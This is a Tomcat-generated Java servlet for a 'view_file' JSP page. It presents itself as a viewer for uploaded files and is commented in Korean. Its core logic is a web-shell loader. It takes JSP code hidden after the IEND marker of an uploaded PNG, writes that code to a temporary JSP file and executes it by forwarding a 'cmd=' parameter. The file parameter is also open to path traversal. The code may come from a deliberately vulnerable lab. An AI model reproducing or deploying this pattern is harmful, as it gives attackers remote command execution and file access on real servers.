/*
 * Generated by the Jasper component of Apache Tomcat
 * Version: Apache Tomcat/9.0.98
 * Generated at: 2025-01-07 04:37:09 UTC
 * Note: The last modified time of this file was set to
 *       the last modified time of the source file after
 *       generation to assist with modification tracking.
 */
package org.apache.jsp;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.jsp.*;
import java.io.*;
import java.nio.file.*;
import java.util.*;
import javax.servlet.*;

public final class view_005ffile_jsp extends org.apache.jasper.runtime.HttpJspBase
    implements org.apache.jasper.runtime.JspSourceDependent,
                 org.apache.jasper.runtime.JspSourceImports {

  private static final javax.servlet.jsp.JspFactory _jspxFactory =
          javax.servlet.jsp.JspFactory.getDefaultFactory();

  private static java.util.Map<java.lang.String,java.lang.Long> _jspx_dependants;

  private static final java.util.Set<java.lang.String> _jspx_imports_packages;

  private static final java.util.Set<java.lang.String> _jspx_imports_classes;

  static {
    _jspx_imports_packages = new java.util.LinkedHashSet<>(8);
    _jspx_imports_packages.add("javax.servlet");
    _jspx_imports_packages.add("java.util");
    _jspx_imports_packages.add("javax.servlet.http");
    _jspx_imports_packages.add("java.io");
    _jspx_imports_packages.add("javax.servlet.jsp");
    _jspx_imports_packages.add("java.nio.file");
    _jspx_imports_classes = null;
  }

  private volatile javax.el.ExpressionFactory _el_expressionfactory;
  private volatile org.apache.tomcat.InstanceManager _jsp_instancemanager;

  public java.util.Map<java.lang.String,java.lang.Long> getDependants() {
    return _jspx_dependants;
  }

  public java.util.Set<java.lang.String> getPackageImports() {
    return _jspx_imports_packages;
  }

  public java.util.Set<java.lang.String> getClassImports() {
    return _jspx_imports_classes;
  }

  public javax.el.ExpressionFactory _jsp_getExpressionFactory() {
    if (_el_expressionfactory == null) {
      synchronized (this) {
        if (_el_expressionfactory == null) {
          _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();
        }
      }
    }
    return _el_expressionfactory;
  }

  public org.apache.tomcat.InstanceManager _jsp_getInstanceManager() {
    if (_jsp_instancemanager == null) {
      synchronized (this) {
        if (_jsp_instancemanager == null) {
          _jsp_instancemanager = org.apache.jasper.runtime.InstanceManagerFactory.getInstanceManager(getServletConfig());
        }
      }
    }
    return _jsp_instancemanager;
  }

  public void _jspInit() {
  }

  public void _jspDestroy() {
  }

  public void _jspService(final javax.servlet.http.HttpServletRequest request, final javax.servlet.http.HttpServletResponse response)
      throws java.io.IOException, javax.servlet.ServletException {

    if (!javax.servlet.DispatcherType.ERROR.equals(request.getDispatcherType())) {
      final java.lang.String _jspx_method = request.getMethod();
      if ("OPTIONS".equals(_jspx_method)) {
        response.setHeader("Allow","GET, HEAD, POST, OPTIONS");
        return;
      }
      if (!"GET".equals(_jspx_method) && !"POST".equals(_jspx_method) && !"HEAD".equals(_jspx_method)) {
        response.setHeader("Allow","GET, HEAD, POST, OPTIONS");
        response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, "JSPs only permit GET, POST or HEAD. Jasper also permits OPTIONS");
        return;
      }
    }

    final javax.servlet.jsp.PageContext pageContext;
    javax.servlet.http.HttpSession session = null;
    final javax.servlet.ServletContext application;
    final javax.servlet.ServletConfig config;
    javax.servlet.jsp.JspWriter out = null;
    final java.lang.Object page = this;
    javax.servlet.jsp.JspWriter _jspx_out = null;
    javax.servlet.jsp.PageContext _jspx_page_context = null;


    try {
      response.setContentType("text/html; charset=UTF-8");
      pageContext = _jspxFactory.getPageContext(this, request, response,
      			null, true, 8192, true);
      _jspx_page_context = pageContext;
      application = pageContext.getServletContext();
      config = pageContext.getServletConfig();
      session = pageContext.getSession();
      out = pageContext.getOut();
      _jspx_out = out;

      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");
      out.write("\n");

    String filename = request.getParameter("filename");
    if (filename == null || filename.trim().equals("")) {
        response.sendError(404, "File not found");
        return;
    }

    // cmd 파라미터가 있는 경우 filename에서 분리
    if (filename.contains("?")) {
        filename = filename.substring(0, filename.indexOf("?"));
    }

    // 파일 경로 설정
    String filePath = request.getServletContext().getRealPath("/uploads") + File.separator + filename;
    File file = new File(filePath);

    if (!file.exists()) {
        response.sendError(404, "File not found");
        return;
    }

    // 파일 확장자 추출
    String extension = "";
    int i = filename.lastIndexOf('.');
    if (i > 0) {
        extension = filename.substring(i + 1).toLowerCase();
    }

    if (extension.equals("jsp")) {
        // JSP 파일일 경우 실행
        try {
            // 파일 전체 내용을 바이트 배열로 읽기
            byte[] allBytes = Files.readAllBytes(file.toPath());
            String content = new String(allBytes, "UTF-8");
            
            // PNG IEND 청크 이후의 JSP 코드 찾기
            String iendMarker = "IEND®B`‚";
            int jspStart = content.indexOf("<%@ page");
            if (content.contains(iendMarker)) {
                jspStart = content.indexOf("<%@ page", content.indexOf(iendMarker));
            }
            
            if (jspStart >= 0) {
                // JSP 코드 추출
                content = content.substring(jspStart);
                
                // 임시 파일 생성 및 실행
                String tempDir = request.getServletContext().getRealPath("/uploads");
                String tempFile = tempDir + File.separator + "temp_" + System.currentTimeMillis() + ".jsp";
                Files.write(Paths.get(tempFile), content.getBytes("UTF-8"));

                // 원본 요청의 모든 파라미터를 임시 파일로 전달
                String queryString = request.getQueryString();
                String tempUrl = "/uploads/" + new File(tempFile).getName();
                if (queryString != null && queryString.contains("cmd=")) {
                    tempUrl += "?" + queryString.substring(queryString.indexOf("cmd="));
                }

                // JSP 파일 실행
                RequestDispatcher rd = request.getRequestDispatcher(tempUrl);
                rd.forward(request, response);
                
                // 임시 파일 삭제
                try {
                    new File(tempFile).delete();
                } catch (Exception e) {
                    // 파일 삭제 실패 시 무시
                }
                return;
            }
        } catch (Exception e) {
            response.sendError(500, "Error executing JSP: " + e.getMessage());
            return;
        }
    }

    // JSP가 아닌 경우 일반 파일로 처리
    String mimeType = getServletContext().getMimeType(file.getName());
    if (mimeType == null) {
        mimeType = "application/octet-stream";
    }
    
    response.setContentType(mimeType);
    
    try (InputStream inStream = new FileInputStream(file);
         OutputStream outStream = response.getOutputStream()) {
        byte[] buffer = new byte[4096];
        int bytesRead;
        while ((bytesRead = inStream.read(buffer)) != -1) {
            outStream.write(buffer, 0, bytesRead);
        }
    }

    } catch (java.lang.Throwable t) {
      if (!(t instanceof javax.servlet.jsp.SkipPageException)){
        out = _jspx_out;
        if (out != null && out.getBufferSize() != 0)
          try {
            if (response.isCommitted()) {
              out.flush();
            } else {
              out.clearBuffer();
            }
          } catch (java.io.IOException e) {}
        if (_jspx_page_context != null) _jspx_page_context.handlePageException(t);
        else throw new ServletException(t);
      }
    } finally {
      _jspxFactory.releasePageContext(_jspx_page_context);
    }
  }
}
